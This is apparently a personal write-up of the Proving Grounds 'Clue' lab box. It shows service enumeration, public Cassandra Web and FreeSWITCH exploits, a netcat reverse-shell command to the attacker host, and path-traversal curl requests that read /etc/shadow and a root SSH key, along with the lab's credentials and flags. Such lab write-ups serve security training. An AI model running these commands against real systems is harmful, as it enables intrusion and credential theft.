---
Date: 2024-10-17
Platform: PG-Practice
Category: Linux
Difficulty: Hard
Status: Complete
IP: 192.168.114.240
Writeup: https://medium.com/@manhon.keung/proving-grounds-practice-linux-box-clue-c5d3a3b825d2
---
# Clue
This was definitely a hard box, but the biggest challenges came from the range of different services AND the box itself not working properly. After a couple of hours bashing my head against the brick wall trying to get initial access, I finally relented and looked at a walkthrough... only to find that the `cassandra` exploit I'd tried to use to display files on the target hadn't worked because the box needed to be reverted.

There's no doubt I'd have gotten there in the end, but there was a LOT of enumeration required to get the passwords, and the SMB shares threw me for quite awhile initially to. Finding the correct files to enumerate could have taken hours more had I not used the walkthrough, but at the same time I was so tired (and pissed off) by the box being broken that I wasn't reading the help files properly to see the clues that would have led me to `/proc/self/cmdline` and `event_socket.conf.xml` sooner. All round a tough box with a few good lessons... made tougher by being broken until I reverted it.

# Resolution summary
- Ran Nmap to identify ports `22`, `80`, `139`, `445`, `3000` & `8021`
- Identified port `3000` as running `Cassandra`
- Identified port `8021` as running `freeswitch`
- Found exploit for `cassandra` that allowed reading `/proc/self/cmdline` which included credentials for `cassie`
- Reused same exploit to read `freeswitch` config file `/etc/freeswitch/autoload_configs/event_socket.conf.xml` which included password for `freeswitch`.
- Found exploit for `freeswitch`, modified exploit to use found password, and achieved initial access.
- Enumerated target host to identify users and sudo privileges
- Used `sudo` privileges of `cassie` to launch internal `cassandra` server and provide `root` access to target system. 
- Checked `.bash_history` of `anthony` and identified `root`'s SSH key copied to `/home/anthony/.ssh/`
- Saved `root` SSH key to local system, then used it to login as `root` via SSH
- Navigated to `/root` and printed proof file
## Improved skills
- Researching new services
- Testing exploits
## Used tools
- nmap
- python
- freeswitch
- smbclient

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN clue.nmap 192.168.114.240 -v
```

Enumerated open TCP ports:
```bash
PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http             Apache httpd 2.4.38
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: 403 Forbidden
139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3000/tcp open  http             Thin httpd
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: thin
|_http-title: Cassandra Web
|_http-favicon: Unknown favicon MD5: 68089FD7828CD453456756FE6E7C4FD8
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: clue
|   NetBIOS computer name: CLUE\x00
|   Domain name: pg
|   FQDN: clue.pg
|_  System time: 2024-10-17T05:01:43-04:00
| smb2-time: 
|   date: 2024-10-17T09:01:44
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h20m01s, deviation: 2h18m35s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```
---
# Enumeration
## Port 22 - SSH (OpenSSH 7.9p1)
No enumeration conducted
## Port 80 - HTTP (Apache 2.4.38)
- Navigated to `http://192.168.114.240:80` and identified `Apache/2.4.38'
![[Pasted image 20241017193659.png]]
- Ran `gobuster dir -u http://192.168.114.240 -w //usr/share/dirb/wordlists/big.txt` to identify any available web directories - identified "backup" folder
![[Pasted image 20241017200202.png]]
- Ran `gobuster dir -u http://192.168.114.240/backup -w //usr/share/dirb/wordlists/big.txt -x php,html,txt` to identify files in `backup`
![[Pasted image 20241017202348.png]]
## Port 139 & 445 - Netbios SSN (Samba 4.9.5-Debian)
- Identified Samba 4.9.5: potentially vulnerable to CVE-2021-44142
- Identified smb service, and ran `smbclient -L //192.168.114.240 -U guest` to connect as `guest` without a password and list all available shares - identified share `guest`
![[Pasted image 20241017195423.png]]
- Ran `smbclient \\\\192.168.114.240\\backup` to connect to share `guest` as user `guest` and listed share contents with `ls`
![[Pasted image 20241017203531.png]]
## Port 3000 - HTTP (Thin httpd)
- Navigated to `http://192.168.114.240:3000` and identified `Cassandra version 3.11.13`
![[Pasted image 20241017194241.png]]
- Identified entry for `system_schema.keyspaces`
![[Pasted image 20241017202047.png]]
- Identified entry for `system.local`
![[Pasted image 20241017201839.png]]
- Identified entry for `system_schema.columns`
![[Pasted image 20241017202250.png]]
- Identified potential exploit [49362](https://www.exploit-db.com/exploits/49362) and attempted file-read access on target machine with `python3 49362.py -p 3000 192.168.114.240 /etc/passwd` - identified users `cassie` and `anthony`
![[Pasted image 20241017210233.png]]
- Ran exploit again with `python3 49362.py -p 3000 192.168.114.240 /proc/self/cmdline` to identify credentials `cassie:SecondBiteTheApple330`
![[Pasted image 20241017211001.png]]
- Ran exploit again with `python3 49362.py -p 3000 192.168.114.240 /etc/freeswitch/autoload_configs/event_socket.conf.xml` to identify `Freeswitch` password `StrongClueConEight021`
![[Pasted image 20241017212201.png]]
## Port 8021 - freeswitch
- Ran NMap and identified `freeswitch` service running on port `8021`
---
# Exploitation
- Identified `freeswitch` potentially vulnerable to exploit [47799](https://www.exploit-db.com/exploits/47799) , saved locally as `freeswitch-exploit.py`
	- Updated `freeswitch-exploit.py` to replace default password "ClueCon" with "StrongClueConEight021"
![[Pasted image 20241017212354.png]]
- Saved `freeswitch-exploit.py` and ran `python3 freeswitch-exploit.py 192.168.114.240 whoami`
![[Pasted image 20241017212609.png]]
- Started netcat listener on port `80`, then ran exploit again with `python3 freeswitch-exploit.py 192.168.114.240 'nc -c /bin/bash 192.168.45.154 80'` to establish reverse shell
![[Pasted image 20241017214317.png]]
- Ran `find / -name local.txt -type f 2>/dev/null` to identify `local.txt`, and ran `cat /var/lib/freeswitch/local.txt` to print `6e79f3911c9a13321d9d94e2e621b593`
---
# Lateral Movement to user
- Ran `su cassie` with found password `SecondBiteTheApple330` to switch to user `cassie` 
![[Pasted image 20241017214945.png]]
---
# Privilege Escalation
## Local Enumeration
- Navigated to `/home/cassie`, identified `id_rsa` file and ran `cat id_rsa` to display SSH private key
![[Pasted image 20241017215717.png]]
- Ran `ssh2john` to crack `cassie` RSA key - no password found
![[Pasted image 20241017221006.png]]
- Ran `sudo -l` to identify `sudo` privileges
![[Pasted image 20241017220245.png]]
## Privilege Escalation vector
- Ran `sudo /usr/local/bin/cassandra-web -B 0.0.0.0:4444 -u cassie -p SecondBiteTheApple330` to launch Cassandra server on localhost as `root`
![[Pasted image 20241017222827.png]]
- Re-ran exploit `python3 freeswitch-exploit.py 192.168.114.240 'nc -c /bin/bash 192.168.45.154 80'` to establish 2nd reverse shell, then ran `curl --path-as-is localhost:4444/../../../../../../../../../etc/shadow` to display password hashes
![[Pasted image 20241017222955.png]]
- Saved password hashes for `root` and `anthony` to `cluehash`
![[Pasted image 20241017223413.png]]
- Ran `curl --path-as-is localhost:4444/../../../../../../../../../home/anthony/.bash_history` to view `anthony` bash history
![[Pasted image 20241017224212.png]]
- Identified `root` RSA key has been copied to `/home/anthony/.ssh/id_rsa` - ran `curl --path-as-is localhost:4444/../../../../../../../../../home/anthony/.ssh/id_rsa` to display `root` RSA private key
![[Pasted image 20241017224304.png]]
- Copied `root` RSA private key to local file `root_rsa` and logged into `root` user with `ssh -i root_rsa root@192.168.114.240`
![[Pasted image 20241017224610.png]]
- Ran `cat /root/proof.txt` and printed `The proof is in another file`
- Listed directory contents and identified `proof_youtriedharder.txt` - ran `cat proof_youtriedharder.txt` to print `85cf69abf0ad2cced9e676fdeeef3702`
---
# Trophy & Loot
`local.txt` = `6e79f3911c9a13321d9d94e2e621b593`
`proof.txt` = `85cf69abf0ad2cced9e676fdeeef3702`